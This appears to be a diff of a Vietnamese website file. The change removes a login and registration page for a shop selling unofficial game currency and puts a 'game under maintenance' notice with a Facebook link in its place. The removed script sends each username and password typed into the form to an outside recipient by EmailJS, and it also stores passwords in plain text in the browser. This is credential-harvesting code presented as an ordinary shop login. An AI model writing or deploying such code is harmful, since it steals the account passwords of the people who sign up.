@@ -3,224 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ Thống Đăng Nhập</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <title>🔧 Thông Báo Cập Nhật 🔧</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #121212;
+            color: white;
+            padding: 50px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+        .facebook-icon {
+            display: inline-block;
+            margin-top: 20px;
+            font-size: 30px;
+            color: #1877F2;
+            text-decoration: none;
+            transition: transform 0.3s;
+        }
+        .facebook-icon:hover {
+            transform: scale(1.2);
+        }
+        .worker-icon {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        h1 {
+            top: 30%;
+            left: 40%;
+        }
+    </style>
 </head>
-<style type="text/css">
-    #notification {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        z-index: 9999;
-        padding: 15px 25px;
-        border-radius: 10px;
-        font-size: 16px;
-        font-weight: bold;
-        transition: opacity 0.5s ease-in-out;
-    }
-</style>
-<body class="bg-gray-900 flex items-center justify-center min-h-screen">
-    <div class="bg-gray-800 text-white rounded-lg shadow-lg p-8 max-w-3xl w-full flex flex-col md:flex-row" id="container">
-        <!-- Phần thông tin -->
-        <div class="w-full md:w-1/2 p-5">
-            <h1 class="text-3xl font-bold">quanhuylau.online</h1>
-            <p class="mt-4 text-sm text-gray-400">
-                Là một hệ thống quân huy lậu nhập từ các nguồn không phải của Garena,
-                đảm bảo cho người chơi có trải nghiệm tốt và giá rẻ. Cam kết không bị ban.
-            </p>
-            <p class="text-red-400">⚠ Lưu ý: Cân nhắc khi mua số lượng lớn bởi dễ bị ban!</p>
-            <p class="text-blue-400">👥 Số lượng tài khoản đã đăng ký trên máy chủ: <strong id="total-users">1394</strong></p>
-        </div>
-
-        <!-- Phần form đăng nhập -->
-        <div class="w-full md:w-1/2 bg-gray-700 p-6 rounded-lg" id="form-container">
-            <h2 class="text-xl font-semibold" id="form-title">Đăng nhập hệ thống</h2>
-            <p class="text-sm text-gray-400">Nếu bạn chưa có tài khoản, <a href="#" id="toggle-form" class="text-red-400">Đăng Ký Ngay!</a></p>
-            <form class="mt-4" id="auth-form">
-                <label class="block text-sm">Tài khoản</label>
-                <input type="text" id="username" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="username" required>
-
-                <label class="block text-sm mt-3">Mật khẩu</label>
-                <div class="relative">
-                    <input type="password" id="password" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500 pr-10" placeholder="******" required>
-                    <button type="button" id="toggle-password" class="absolute right-2 top-2 text-gray-400">👁</button>
-                </div>
-
-                <div id="captcha-container" class="mt-3">
-                    <label class="block text-sm" id="captcha">Mã Captcha</label>
-                    <div class="flex items-center">
-                        <input type="text" id="captcha-input" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="Nhập mã Captcha">
-                        <span id="captcha-code" class="ml-2 p-2 bg-gray-500 text-white rounded text-lg font-bold"></span>
-                        <button type="button" id="refresh-captcha" class="ml-2 text-blue-400 text-lg">🔄</button>
-                    </div>
-                </div>
-
-                <div id="confirm-password-container" class="hidden">
-                    <label class="block text-sm mt-3">Nhập lại mật khẩu</label>
-                    <div class="relative">
-                        <input type="password" id="confirm-password" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500 pr-10" placeholder="******">
-                        <button type="button" id="toggle-confirm-password" class="absolute right-2 top-2 text-gray-400">👁</button>
-                    </div>
-                </div>
-
-                <button type="submit" class="mt-4 w-full bg-blue-500 p-2 rounded text-white font-semibold hover:bg-blue-600" id="submit-btn">Đăng nhập</button>
-            </form>
-        </div>
+<body>
+    <div class="container">
+        <h1 style="font-size: 250px;position: fixed;">👷</h1>
+        <h1>🚀 Game Đang Cập Nhật 🚀</h1>
+        <p>🔥 Chào các game thủ thân mến! 🔥</p>
+        <p>Hiện tại, chúng tôi đang thực hiện bảo trì và cập nhật để mang đến cho bạn trải nghiệm tốt hơn. Quá trình này có thể mất một khoảng thời gian ⏳, nhưng chúng tôi cam kết sẽ sớm trở lại với nhiều tính năng hấp dẫn 💥 và tối ưu hóa hệ thống ⚙️.</p>
+        <p>Hãy theo dõi fanpage của chúng tôi để nhận thông tin mới nhất về quá trình cập nhật! 📢</p>
+        <a class="facebook-icon" href="https://fb.com/tnc0210" target="_blank">🔵 Facebook 🔵</a>
     </div>
-
-    <div id="notification" class="fixed bottom-5 right-5 bg-green-500 text-white p-3 rounded-lg shadow-lg hidden">
-        <p id="notification-text"></p>
-    </div>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script>
-document.addEventListener("DOMContentLoaded", function () {
-    emailjs.init('BUHtg1BuVtAPT9O2M');
-
-    const authForm = document.getElementById("auth-form");
-    const usernameInput = document.getElementById("username");
-    const passwordInput = document.getElementById("password");
-    const confirmPasswordInput = document.getElementById("confirm-password");
-    const submitBtn = document.getElementById("submit-btn");
-    const formTitle = document.getElementById("form-title");
-    const toggleForm = document.getElementById("toggle-form");
-    const captchaCode = document.getElementById("captcha-code");
-    const captchaInput = document.getElementById("captcha-input");
-    const refreshCaptcha = document.getElementById("refresh-captcha");
-    const totalUsersDisplay = document.getElementById("total-users");
-    const notification = document.getElementById("notification");
-
-    let totalUsers = parseInt(localStorage.getItem("totalUsers")) || 1394;
-    totalUsersDisplay.textContent = totalUsers;
-
-    let isRegistering = false;
-
-    function getUsers() {
-        try {
-            return JSON.parse(localStorage.getItem("users")) || {};
-        } catch (error) {
-            console.error("Lỗi đọc dữ liệu users từ localStorage:", error);
-            return {};
-        }
-    }
-
-    function saveUser(username, password) {
-        const users = getUsers();
-        users[username] = { password, balance: 0 };
-        localStorage.setItem("users", JSON.stringify(users));
-
-        totalUsers++;
-        localStorage.setItem("totalUsers", totalUsers.toString());
-        totalUsersDisplay.textContent = totalUsers;
-    }
-
-    function showNotification(message, bgColor) {
-        notification.textContent = message;
-        notification.className = `fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 ${bgColor} text-white p-3 rounded-lg shadow-lg`;
-        notification.style.display = "block";
-
-        setTimeout(() => notification.style.display = "none", 3000);
-    }
-
-    const loggedInUser = localStorage.getItem("loggedInUser");
-    if (loggedInUser && getUsers()[loggedInUser]) {
-        window.location.href = "shop.html";
-        return;
-    }
-
-    toggleForm.addEventListener("click", function (e) {
-        e.preventDefault();
-        isRegistering = !isRegistering;
-
-        formTitle.textContent = isRegistering ? "Đăng ký tài khoản" : "Đăng nhập hệ thống";
-        submitBtn.textContent = isRegistering ? "Đăng ký" : "Đăng nhập";
-        document.getElementById("confirm-password-container").classList.toggle("hidden", !isRegistering);
-        document.getElementById("captcha-container").classList.toggle("hidden", isRegistering);
-        toggleForm.textContent = isRegistering ? "Đã có tài khoản? Đăng nhập!" : "Đăng Ký Ngay!";
-
-        if (!isRegistering) generateCaptcha();
-    });
-
-    function sendEmail(action, username, password) {
-        emailjs.send('default_service', 'template_mcvqowq', {
-            from_name: username,
-            to_name: "Người nhận",
-            message: `${action}:
-Tài khoản: ${username}
-Mật khẩu: ${password}`,
-            reply_to: username,
-        }).then(
-            response => console.log('Email sent:', response),
-            error => console.error('Email error:', error)
-        );
-    }
-
-    authForm.addEventListener("submit", function (e) {
-        e.preventDefault();
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
-        const confirmPassword = confirmPasswordInput.value.trim();
-        const users = getUsers();
-
-        if (isRegistering) {
-            if (username.length < 5) return showNotification("⚠ Tài khoản phải có ít nhất 5 ký tự!", "bg-red-500");
-            if (password.length < 8) return showNotification("⚠ Mật khẩu phải có ít nhất 8 ký tự!", "bg-red-500");
-            if (users[username]) return showNotification("⚠ Tài khoản đã tồn tại!", "bg-red-500");
-            if (password !== confirmPassword) return showNotification("⚠ Mật khẩu không khớp!", "bg-red-500");
-
-            saveUser(username, password);
-            sendEmail("Đăng ký thành công", username, password);
-            showNotification("✅ Đăng ký thành công!", "bg-green-500");
-            toggleForm.click();
-            return;
-        }
-
-        if (!users[username] || users[username].password !== password) {
-            showNotification("⚠ Sai tài khoản hoặc mật khẩu!", "bg-red-500");
-            generateCaptcha();
-            return;
-        }
-        if (captchaInput.value !== captchaCode.textContent) {
-            showNotification("⚠ Captcha không chính xác!", "bg-red-500");
-            generateCaptcha();
-            return;
-        }
-
-        showNotification("✅ Đăng nhập thành công!", "bg-green-500");
-        sendEmail("Đăng nhập thành công", username, password);
-        localStorage.setItem("loggedInUser", username);
-        setTimeout(() => window.location.href = "shop.html", 1000);
-    });
-
-    function generateCaptcha() {
-        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        captchaCode.textContent = Array.from({ length: 4 }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
-    }
-
-    refreshCaptcha.addEventListener("click", generateCaptcha);
-    generateCaptcha();
-
-    function togglePasswordVisibility(inputField, toggleButton) {
-        if (inputField.type === "password") {
-            inputField.type = "text";
-            toggleButton.textContent = "🙈";
-        } else {
-            inputField.type = "password";
-            toggleButton.textContent = "👁";
-        }
-    }
-
-    document.getElementById("toggle-password").addEventListener("click", function () {
-        togglePasswordVisibility(passwordInput, this);
-    });
-
-    document.getElementById("toggle-confirm-password").addEventListener("click", function () {
-        togglePasswordVisibility(confirmPasswordInput, this);
-    });
-});
-
-
-    </script>
 </body>
 </html>
